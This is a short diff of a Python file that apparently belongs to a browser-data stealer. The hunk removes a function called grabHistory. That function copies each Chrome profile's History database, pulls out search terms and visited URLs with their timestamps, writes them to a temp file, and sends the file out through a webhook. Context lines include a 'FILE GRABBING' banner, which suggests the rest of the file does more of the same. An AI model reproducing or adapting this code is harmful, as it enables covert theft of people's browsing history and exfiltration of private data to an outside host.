@@ -326,46 +326,6 @@ def main():
   
 if __name__ == "__main__":
     main()
-# ///////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-def grabHistory(self):
-    f = open("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\ChromeHistory.txt", 'w', encoding="cp437", errors='ignore')
-
-    def extract_search_history(db_cursor):
-        db_cursor.execute('SELECT term FROM keyword_search_terms')
-        search_terms = ""
-        for item in db_cursor.fetchall():
-            if item[0] != "":
-                search_terms += f"{item[0]}\n"
-        return search_terms
-
-    def extract_web_history(db_cursor):
-        web = ""
-        db_cursor.execute('SELECT title, url, last_visit_time FROM urls')
-        for item in db_cursor.fetchall():
-            web += f"Title: {item[0]}\nUrl: {item[1]}\nLast Time Visit: {self.convert_time(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
-        return web
-
-    for prof in os.listdir(self.chrome_user_data):
-        if re.match(self.chrome_reg, prof):
-            login_db = ntpath.join(self.chrome_user_data, prof, 'History')
-            login = self.create_temp_file()
-
-            shutil.copy2(login_db, login)
-            conn = sqlite3.connect(login)
-            cursor = conn.cursor()
-
-            search_history = extract_search_history(cursor)
-            web_history = extract_web_history(cursor)
-
-            f.write(f"{' '*17}Search History\n{'-'*50}\n{search_history}\n{' '*17}\n\nWeb History\n{'-'*50}\n{web_history}")
-            history_file = File("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\ChromeHistory.txt", name = "history.txt")
-            webhook.send("", file = history_file)
-            
-            cursor.close()
-            conn.close()
-            os.remove(login)
-    f.close()
     
 # ███████╗██╗██╗     ███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗ 
 # ██╔════╝██║██║     ██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝ 
